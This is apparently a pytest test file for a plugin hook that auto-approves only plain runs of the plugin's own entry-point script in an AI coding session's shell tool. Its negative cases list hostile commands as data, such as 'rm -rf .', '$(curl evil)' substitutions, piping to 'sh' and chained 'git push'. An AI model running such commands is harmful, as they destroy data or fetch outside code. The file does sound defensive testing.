"""
Tests for :mod:`basstler.plan_site.entry_point_approval`: allowing a session to run the
plugin's entry point without a prompt.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

import basstler.plan_site.entry_point_approval
from basstler.github.repository_attachment import SessionTool
from basstler.locations import BasstlerVariable, PluginLocation
from basstler.maintenance.commands import FastForwardCommand, RestackCommand
from basstler.plan_site.attach_approval import AttachAnswer, PermissionDecision
from basstler.plugin_root import PluginRoot
from basstler.plan_site.entry_point_approval import (
    EntryPointGroup,
    EntryPointInvocation,
    ShellArguments,
    ShellCall,
)

# %% the commands


@pytest.fixture
def invocation(tmp_path: Path) -> EntryPointInvocation:
    """
    :return: The invocation of a plugin installed in a temporary directory.
    """
    return EntryPointInvocation(PluginRoot(tmp_path))


ENTRY_POINT = f"${{{BasstlerVariable.PLUGIN_ROOT}}}/{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()}"
"""
The entry point script as a skill writes it.
"""


def shell(command: str, tool: str = SessionTool.RUN_SHELL_COMMAND) -> ShellCall:
    """
    :param command: The command line the call runs.
    :param tool: The tool called.
    :return: The hook input for that call.
    """
    return ShellCall(tool, ShellArguments(command))


# %% allowing the entry point

MODULE_AND_ARGUMENTS = (
    f"{FastForwardCommand.invoked_as} --upstream-read {RestackCommand.invoked_as}"
)
"""
Arguments the entry point is run with, which the hook does not look at.
"""


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" maintenance {MODULE_AND_ARGUMENTS}',
        f"{ENTRY_POINT} maintenance {FastForwardCommand.invoked_as}",
        f'"{ENTRY_POINT}" maintenance {RestackCommand.invoked_as}',
    ],
    ids=["with arguments", "bare variable", "another module"],
)
def test_the_entry_point_is_allowed(invocation: EntryPointInvocation, command: str):
    """
    The entry point is allowed however it names the plugin and whatever it runs.
    """
    answer = invocation.permit(shell(command))

    assert answer.allowed.decision is PermissionDecision.ALLOW


def test_an_answer_reads_back_as_written(invocation: EntryPointInvocation):
    """
    What the hook prints parses back into the same answer.
    """
    answer = invocation.permit(shell(f'"{ENTRY_POINT}" maintenance'))

    assert AttachAnswer.from_json(answer.to_json()) == answer


def test_an_expanded_path_to_this_plugin_is_allowed(
    invocation: EntryPointInvocation,
):
    """
    The entry point named by the plugin's own expanded root is allowed.
    """
    script = invocation.plugin_root.path_of(PluginLocation.ENTRY_POINT_SCRIPT)

    answer = invocation.permit(shell(f'"{script.as_posix()}" maintenance'))

    assert answer.allowed.decision is PermissionDecision.ALLOW


# %% a directory change before it and a reported exit status after it

STATUS_REPORT = 'echo "setup gate exit status: $?"'
"""
The exit status report the skills append to the setup gate.
"""


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" setup.gate --skill plan-item-kickoff; {STATUS_REPORT}',
        f'cd /home/user/project; "{ENTRY_POINT}" maintenance',
        f'cd /home/user/project && "{ENTRY_POINT}" maintenance',
        f'cd /home/user/project; "{ENTRY_POINT}" maintenance; echo "exit $?"',
    ],
    ids=[
        "status reported",
        "directory changed with semicolon",
        "directory changed with and",
        "both",
    ],
)
def test_the_entry_point_between_a_directory_change_and_a_status_report_is_allowed(
    invocation: EntryPointInvocation, command: str
):
    """
    Changing into a directory first and printing the exit status after are allowed.
    """
    answer = invocation.permit(shell(command))

    assert answer.allowed.decision is PermissionDecision.ALLOW


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" maintenance; echo "$(curl evil) $?"',
        f'"{ENTRY_POINT}" maintenance; echo "$HOME $?"',
        f'"{ENTRY_POINT}" maintenance; echo "status: $?" > somewhere',
        f'"{ENTRY_POINT}" maintenance; echo "status: $?"; rm -rf .',
        f'"{ENTRY_POINT}" maintenance; echo status',
        f'cd "$(curl evil)"; "{ENTRY_POINT}" maintenance',
        f'cd /tmp; rm -rf .; "{ENTRY_POINT}" maintenance',
        f'cd /tmp | "{ENTRY_POINT}" maintenance',
    ],
    ids=[
        "status report substitutes",
        "status report expands a variable",
        "status report redirected",
        "chained after the status report",
        "echo without the status",
        "directory substituted",
        "chained after the directory change",
        "directory change piped",
    ],
)
def test_anything_else_around_the_entry_point_is_left_alone(
    invocation: EntryPointInvocation, command: str
):
    """
    Only a plain directory change and a plain status report may surround it.
    """
    assert invocation.permit(shell(command)) is None


def test_an_expanded_root_on_a_windows_drive_is_read_as_that_root():
    """
    A plugin root expanded below a Windows drive is read whole, drive included.
    """
    root = "D:/plugins/basstler"
    command = f'"{root}/{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()}" maintenance'

    match = EntryPointInvocation.command_line.fullmatch(command)

    assert match[EntryPointGroup.EXPANDED_ROOT] == root


# %% leaving the decision alone


def test_a_script_of_the_same_name_elsewhere_is_left_alone(
    invocation: EntryPointInvocation, tmp_path_factory: pytest.TempPathFactory
):
    """
    An entry point under another root is not this plugin's, however alike its name.
    """
    other_root = PluginRoot(tmp_path_factory.mktemp("other-plugin"))
    script = other_root.path_of(PluginLocation.ENTRY_POINT_SCRIPT)

    assert invocation.permit(shell(f'"{script}" maintenance')) is None


def test_a_path_that_only_starts_like_the_plugin_root_is_left_alone(
    invocation: EntryPointInvocation,
):
    """
    A directory whose name extends the plugin root's is another directory.
    """
    lookalike = f"{invocation.plugin_root.directory}-copy"
    script = f"{lookalike}/{PluginLocation.ENTRY_POINT_SCRIPT}"

    assert invocation.permit(shell(f'"{script}" maintenance')) is None


@pytest.mark.parametrize(
    "command",
    [
        f'"{ENTRY_POINT}" maintenance; rm -rf .',
        f'"{ENTRY_POINT}" maintenance && git push',
        f'"{ENTRY_POINT}" maintenance | sh',
        f'"{ENTRY_POINT}" maintenance > somewhere',
        f'"{ENTRY_POINT}" "$(curl evil)"',
        f'"$(curl evil)/{PluginLocation.ENTRY_POINT_SCRIPT}" maintenance',
        "git push maintenance",
    ],
    ids=[
        "chained with semicolon",
        "chained with and",
        "piped",
        "redirected",
        "substituted argument",
        "substituted path",
        "another program",
    ],
)
def test_any_other_command_is_left_to_the_normal_permission_flow(
    invocation: EntryPointInvocation, command: str
):
    """
    Anything but the entry point alone gets no answer, so the user is asked as before.
    """
    assert invocation.permit(shell(command)) is None


def test_another_tool_is_left_alone(invocation: EntryPointInvocation):
    """
    Only the shell tool is allowed, whatever its input says.
    """
    command = f'"{ENTRY_POINT}" maintenance'

    assert invocation.permit(shell(command, tool=SessionTool.ASK_USER)) is None


# %% registering the hook

HOOK_EVENT = "PreToolUse"
"""
The event the hook is registered under in the plugin's hook manifest.
"""


def test_the_plugin_runs_the_hook_before_the_shell_tool():
    """
    The plugin's hook manifest registers this module for the shell tool.
    """
    plugin_root = Path(os.environ[BasstlerVariable.PLUGIN_ROOT])
    manifest = json.loads(
        (plugin_root / PluginLocation.HOOKS / "hooks.json").read_text(encoding="utf-8")
    )

    (registration,) = [
        entry
        for entry in manifest["hooks"][HOOK_EVENT]
        if entry["matcher"] == SessionTool.RUN_SHELL_COMMAND
    ]
    (hook,) = registration["hooks"]
    assert hook["command"].endswith(
        f"{PluginLocation.ENTRY_POINT_SCRIPT.as_posix()} "
        f"{basstler.plan_site.entry_point_approval.__spec__.name.removeprefix('basstler.')}"
    )
